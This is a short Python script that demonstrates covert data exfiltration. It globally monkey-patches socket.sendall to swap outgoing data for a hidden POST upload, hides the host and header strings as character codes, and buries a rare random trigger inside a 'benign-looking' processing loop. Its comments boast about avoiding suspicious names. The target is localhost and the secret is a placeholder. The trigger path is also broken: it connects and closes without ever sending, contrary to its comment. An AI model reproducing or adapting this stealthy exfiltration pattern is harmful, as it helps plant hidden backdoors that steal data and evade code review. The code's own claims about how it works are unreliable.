import socket
import builtins
import time
import random
import threading

# --- Save original sendall ---
_original_sendall = socket.socket.sendall


def _patched_sendall(self, data, *args, **kwargs):
    # Check if we have any hidden data attached
    hidden = getattr(self, "_hidden_data", None)
    if hidden is None:
        # Normal send
        return _original_sendall(self, data, *args, **kwargs)

    # Only send hidden data once per connection
    if getattr(self, "_hidden_sent", False):
        # Already sent hidden data, fallback to normal
        return _original_sendall(self, data, *args, **kwargs)

    # Build target host & headers character by character, obfuscated
    pieces = [
        99,
        111,
        110,
        116,
        101,
        110,
        116,
        45,
        116,
        121,
        112,
        101,
        58,
        32,
        97,
        112,
        112,
        108,
        105,
        99,
        97,
        116,
        105,
        111,
        110,
        47,
        111,
        99,
        116,
        101,
        116,
        45,
        115,
        116,
        114,
        101,
        97,
        109,
        13,
        10,
    ]
    header = "".join(chr(c) for c in pieces)

    host_pieces = [108, 111, 99, 97, 108, 104, 111, 115, 116]
    host = "".join(chr(c) for c in host_pieces)

    # Construct POST request in pieces, only now
    request_lines = [
        b"POST /upload HTTP/1.1\r\n",
        f"Host: {host}\r\n".encode(),
        header.encode(),
        f"Content-Length: {len(hidden)}\r\n\r\n".encode(),
        hidden,
    ]
    request = b"".join(request_lines)

    # Send the constructed request, replacing original data
    res = _original_sendall(self, request, *args, **kwargs)

    # Mark as sent to prevent re-send
    self._hidden_sent = True

    return res


# --- Patch socket.sendall ---
socket.socket.sendall = _patched_sendall

# --- A generic, benign-looking function to trigger sending ---


def process_data(seed: int):
    # Simulate heavy processing
    acc = 0
    for i in range(100000):
        acc += (i * seed) % 97
        if i % 20000 == 0:
            time.sleep(0.001)

    # Rare trigger: environment + RNG
    if seed % 13 == 7 and random.randint(1, 1000000) == 123456:
        # Prepare secret data disguised as 'checksum'
        secret = b"PhD-level-Secret-Configuration"

        # Create socket and attach secret under generic attribute
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Attach secret payload to the socket object — no suspicious names!
        setattr(s, "_hidden_data", secret)

        # Connect triggers patched sendall sending our hidden data
        s.connect(("127.0.0.1", 8080))
        s.close()

    return acc


# --- Example driver code to simulate normal program flow ---


def main_loop():
    for i in range(100):
        val = process_data(i)
        if i % 10 == 0:
            # Fake unrelated work
            time.sleep(0.01)


if __name__ == "__main__":
    main_loop()
